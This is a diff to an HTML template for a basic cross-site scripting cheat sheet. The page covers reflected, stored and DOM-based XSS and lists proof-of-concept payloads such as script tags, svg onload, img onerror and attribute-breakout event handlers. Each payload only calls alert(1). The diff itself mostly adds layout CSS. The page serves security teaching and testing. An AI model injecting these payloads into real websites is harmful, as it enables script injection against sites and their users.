@@ -52,67 +52,86 @@ pre code {
     border-radius: 5px;
     overflow-x: auto;
 }
+.container {
+        width: 90%;
+        margin: auto;
+        padding: 20px;
+        background-color: #fff;
+        box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        border-radius: 10px;
+        margin-top: 30px;
+      }
+      .scrollable-content {
+        height: 450px; /* Adjust the height as needed */
+        overflow-y: auto;
+        padding-right: 20px;
+      }
 
     </style>
 </head>
 <body>
-    <h1>XSS Cheat Sheet (Basic)</h1>
+    <div class="container">
 
-    <h2>Introduction</h2>
-    <p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There are 3 types of XSS Attack:</p>
-    <ul>
-        <li>Reflected XSS: Attack where the malicious script runs from another website through the web browser</li>
-        <li>Stored XSS: Stored attacks are those where the injected script is permanently stored on the target servers</li>
-        <li>DOM-Based XSS: A type of XSS that has payloads found in the DOM rather than within the HTML code</li>
-    </ul>
-
-    <h2>Where to find</h2>
-    <p>This vulnerability can appear in all features of the application. If you want to find Dom-based XSS, you can find it by reading the javascript source code.</p>
-
-    <h2>How to exploit</h2>
-    <ol>
-        <li>
-            <p>Basic payload</p>
-            <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
-&lt;svg/onload=alert(1)&gt;
-&lt;img src=x onerror=alert(1)&gt;</code></pre>
-        </li>
-        <li>
-            <p>Add ' or " to escape the payload from value of an HTML tag</p>
-            <pre><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
-'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
-        </li>
-        <li>
-            <p>Add --&gt; to escape the payload if input lands in HTML comments.</p>
-            <pre><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
-        </li>
-        <li>
-            <p>Add &lt;/tag&gt; when the input inside or between opening/closing tags, tag can be &lt;a&gt;,&lt;title&gt;,&lt;script&gt; and any other HTML tags</p>
-            <pre><code>&lt;/tag&gt;&lt;script&gt;alert(1)&lt;/script&gt;
-"&gt;&lt;/tag&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
-        </li>
-        <li>
-            <p>Use when input inside an attribute’s value of an HTML tag but &gt; is filtered</p>
-            <pre><code>" onmouseover=alert(1)
-" autofocus onfocus=alert(1)</code></pre>
-        </li>
-        <li>
-            <p>Use &lt;/script&gt; when input inside &lt;script&gt; tags</p>
-            <pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
-        </li>
-    </ol>
-
-    <h3>XSS Cheat Sheet (Advanced)</h3>
-    <p>For more advanced XSS techniques, please refer to the provided references.</p>
-
-    <h3>XSS Cheat Sheet (Bypass)</h3>
-    <p>For bypass techniques, please refer to the provided references.</p>
-
-    <h2>References</h2>
-    <ul>
-        <li><a href="https://brutelogic.com.br/">Brute Logic</a></li>
-        <li><a href="https://github.com/0xInfection/Awesome-WAF">Awesome-WAF</a></li>
-        <li>Some random Twitter posts</li>
-    </ul>
-</body>
-{% endblock %}
+        <h1>XSS Cheat Sheet (Basic)</h1>
+        <div class="scrollable-content">
+            
+            <h2>Introduction</h2>
+            <p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There are 3 types of XSS Attack:</p>
+            <ul>
+                <li>Reflected XSS: Attack where the malicious script runs from another website through the web browser</li>
+                <li>Stored XSS: Stored attacks are those where the injected script is permanently stored on the target servers</li>
+                <li>DOM-Based XSS: A type of XSS that has payloads found in the DOM rather than within the HTML code</li>
+            </ul>
+            
+            <h2>Where to find</h2>
+            <p>This vulnerability can appear in all features of the application. If you want to find Dom-based XSS, you can find it by reading the javascript source code.</p>
+            
+            <h2>How to exploit</h2>
+            <ol>
+                <li>
+                    <p>Basic payload</p>
+                    <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+                        &lt;svg/onload=alert(1)&gt;
+                        &lt;img src=x onerror=alert(1)&gt;</code></pre>
+            </li>
+            <li>
+                <p>Add ' or " to escape the payload from value of an HTML tag</p>
+                <pre><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+                    '&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                </li>
+                <li>
+                    <p>Add --&gt; to escape the payload if input lands in HTML comments.</p>
+                    <pre><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                </li>
+                <li>
+                    <p>Add &lt;/tag&gt; when the input inside or between opening/closing tags, tag can be &lt;a&gt;,&lt;title&gt;,&lt;script&gt; and any other HTML tags</p>
+                    <pre><code>&lt;/tag&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+                        "&gt;&lt;/tag&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                    </li>
+                    <li>
+                        <p>Use when input inside an attribute’s value of an HTML tag but &gt; is filtered</p>
+                        <pre><code>" onmouseover=alert(1)
+                            " autofocus onfocus=alert(1)</code></pre>
+                        </li>
+                        <li>
+                            <p>Use &lt;/script&gt; when input inside &lt;script&gt; tags</p>
+                            <pre><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+                        </li>
+                    </ol>
+                    
+                    <h3>XSS Cheat Sheet (Advanced)</h3>
+                    <p>For more advanced XSS techniques, please refer to the provided references.</p>
+                    
+                    <h3>XSS Cheat Sheet (Bypass)</h3>
+                    <p>For bypass techniques, please refer to the provided references.</p>
+                    
+                    <h2>References</h2>
+                    <ul>
+                        <li><a href="https://brutelogic.com.br/">Brute Logic</a></li>
+                        <li><a href="https://github.com/0xInfection/Awesome-WAF">Awesome-WAF</a></li>
+                        <li>Some random Twitter posts</li>
+                    </ul>
+                </div>
+                </div>
+            </body>
+            {% endblock %}
